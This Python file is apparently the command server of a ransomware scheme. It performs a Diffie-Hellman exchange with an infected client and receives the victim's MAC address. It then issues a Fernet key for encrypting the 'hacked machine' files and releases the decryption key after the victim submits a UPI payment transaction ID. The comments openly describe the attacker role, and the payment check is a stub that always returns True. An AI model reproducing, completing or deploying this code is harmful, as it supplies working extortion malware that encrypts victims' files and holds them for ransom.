import json
from random import randint
import socket
import uuid
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
PORT = 9001
CHUNK_SIZE = 4096
MAX_CLIENTS = 1


def extract_prime_and_primitive_root():
    # read file
    with open('val.json', 'r') as myfile:
        data = myfile.read()

    # parse file
    obj = json.loads(data)

    prime = obj['prime']
    primitive_root = obj['primitive_root']

    # show values
    # print("prime: " + str(obj['prime']))
    # print("primitive_root: " + str(obj['primitive_root']))
    return prime, primitive_root


# Generate a prime number
def gen_prime(start, stop):
    mod_list = []

    # Generate list of prime numbers
    for num in range(start, stop):
        if num > 1:
            for i in range(2, num):
                if (num % i) == 0:
                    break
            else:
                mod_list.append(num)

    # Randomly pick a number to pick a number from the list
    x = randint(1,len(mod_list)-1)
    return mod_list[x]


# b^e%m
def fast_exp(b, e, m):
    r = 1
    if 1 & e:
        r = b
    while e:
        e >>= 1
        b = (b * b) % m
        if e & 1: r = (r * b) % m
    return r


def generate_public_key(private_key, primitive_root, prime):
    # public_key = (primitive_root**private_key)%prime
    # return public_key
    public_key = fast_exp(primitive_root, private_key, prime)
    return public_key


def key_pair_generation_diffie_hellman(prime, primitive_root):
    private_key = gen_prime(1, prime) # Secret key
    public_key = generate_public_key(private_key, primitive_root, prime) # Public key
    return private_key, public_key


def calculate_secret_key(public_key_a, private_key_b, prime):
    secret_key = fast_exp(public_key_a, private_key_b, prime)
    return secret_key


def establish_connection_with_client():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((socket.gethostname(), PORT))
    s.listen(1)

    clt, adr = s.accept()
    print("Connection to " + str(adr) + " established")
    # clt.send(bytes("Socket programming", 'utf-8'))
    return clt

def send_message_to_client(client_endpoint, msg):
    msg = str(msg) 
    msg_encoded = msg.encode('utf-8')
    client_endpoint.send(msg_encoded)

def receive_message_from_client(client_endpoint):
    msg = client_endpoint.recv(CHUNK_SIZE)
    msg_decoded = msg.decode('utf-8')
    return msg_decoded

def send_message_to_client_dierct(client_endpoint, msg):
    client_endpoint.send(msg)

def receive_message_from_client_dierct(client_endpoint):
    msg = client_endpoint.recv(CHUNK_SIZE)
    return msg


def fernet_key_generator(secret_key):
    password_provided = str(secret_key)
    password = password_provided.encode()

    salt = b"\xb9\x1f|}'S\xa1\x96\xeb\x154\x04\x88\xf3\xdf\x05"

    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),
                    length=32,
                    salt=salt,
                    iterations=100000,
                    backend=default_backend())

    key = base64.urlsafe_b64encode(kdf.derive(password))
    f = Fernet(key)
    return f


def check_transaction_status(upi_transaction_id):
    return True

if __name__ == "__main__":
    prime, primitive_root = extract_prime_and_primitive_root()
    print("prime: " + str(prime))
    print("primitive_root: " + str(primitive_root))

    private_key_server, public_key_server = key_pair_generation_diffie_hellman(prime, primitive_root)

    print("private_key_server: " + str(private_key_server))
    print("public_key_server: " + str(public_key_server))
    
    # Establishing connection with client
    client_endpoint = establish_connection_with_client()

    # Sending sever public key to client
    print("[+]Sending sever public key to client")
    send_message_to_client(client_endpoint, public_key_server)

    # Receiving client public key from client
    print("[+]Receiving client public key from client")
    public_key_client = receive_message_from_client(client_endpoint)
    print("public_key_client: " + str(public_key_client))

    secret_key = calculate_secret_key(int(public_key_client), int(private_key_server), prime)
    print("secret key: " + str(secret_key))

    fernet_key = fernet_key_generator(secret_key)

    # Receiving mac address from client
    print("[+]Receiving mac address from client")
    mac_addr_encoded_encrypted = receive_message_from_client_dierct(client_endpoint)
    print(type(mac_addr_encoded_encrypted))
    print("mac_addr_encoded_encrypted: " + str(mac_addr_encoded_encrypted))
    mac_addr_encoded_decrypted = fernet_key.decrypt(mac_addr_encoded_encrypted)
    print("mac_addr_encoded_decrypted: " + str(mac_addr_encoded_decrypted))
    mac_addr_decoded = mac_addr_encoded_decrypted.decode('utf-8')
    print("mac_addr_decoded: " + str(mac_addr_decoded))

    # server(attacker creating enc, dec key for file encryption of hacked machine)
    print("[+]server(attacker creating enc, dec key for file encryption of hacked machine)")
    file_enc_dec_fernet_key = Fernet.generate_key()
    # print(type(file_enc_dec_fernet_key))
    print("file_enc_dec_fernet_key: " + str(file_enc_dec_fernet_key))

    # Storing (enc, dec) key against the client's MAC address in unordred map
    # TODO

    # Encrypting the file_enc_dec_fernet_key with the prev fernet key
    print("[+]Encrypting the file_enc_dec_fernet_key with the prev fernet key")
    file_enc_dec_fernet_key_encrypted = fernet_key.encrypt(file_enc_dec_fernet_key)
    print("file_enc_dec_fernet_key_encrypted: " + str(file_enc_dec_fernet_key_encrypted))
    send_message_to_client_dierct(client_endpoint, file_enc_dec_fernet_key_encrypted)

    # Receiving upi transaction id from client
    print("[+]Receiving upi transaction id from client")
    upi_transaction_id = receive_message_from_client(client_endpoint)
    if(check_transaction_status(upi_transaction_id) == True):
        print("[+]Sending decryption key to client")
        send_message_to_client_dierct(client_endpoint, file_enc_dec_fernet_key_encrypted)
    else:
        failure_msg = "Your payment was not successful!!"
        send_message_to_client(client_endpoint, failure_msg)









